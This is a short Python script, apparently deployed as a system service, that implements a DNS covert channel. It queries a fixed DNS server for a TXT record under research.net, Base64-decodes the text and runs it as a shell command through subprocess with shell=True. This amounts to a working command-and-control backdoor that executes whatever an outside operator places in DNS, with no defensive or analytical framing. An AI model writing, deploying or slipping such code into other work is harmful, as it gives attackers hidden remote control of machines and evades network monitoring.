# stored in /opt/covert_channel for system service to be executed
import dns.resolver
import base64
import subprocess

# Define server and domain
dns_server = "192.168.47.101"
domain = "research.net"

def decode_message(encoded_message):
    """
    Decode the Base64 encoded message.
    """
    return base64.b64decode(encoded_message).decode()

def execute_command(command):
    """
    Execute the decoded command on the server.
    """
    try:
        # Execute the command and get the output
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        if result.returncode == 0:
            print(f"Command executed successfully:\n{result.stdout}")
        else:
            print(f"Error executing command:\n{result.stderr}")
    except Exception as e:
        print(f"Error while executing the command: {e}")

def get_covert_message():
    """
    Query the DNS server for the covert message in the TXT record and execute it.
    """
    subdomain = "covertmessage"  # The subdomain where the message is stored
    
    # Set up DNS resolver to query the specific DNS server
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server]  # Set the DNS server

    try:
        # Query the DNS TXT record
        response = resolver.resolve(f"{subdomain}.{domain}", 'TXT')
        for txt_record in response:
            # Extract and decode the covert message from the TXT record
            encoded_message = txt_record.to_text().strip('"')  # Remove quotes
            decoded_message = decode_message(encoded_message)
            print(f"Decoded Message: {decoded_message}")
            
            # Execute the decoded message as a command
            execute_command(decoded_message)
    except dns.resolver.NoAnswer:
        print("No TXT record found.")
    except dns.resolver.NXDOMAIN:
        print("The domain does not exist.")
    except Exception as e:
        print(f"DNS Query Failed: {e}")

if __name__ == '__main__':
    get_covert_message()
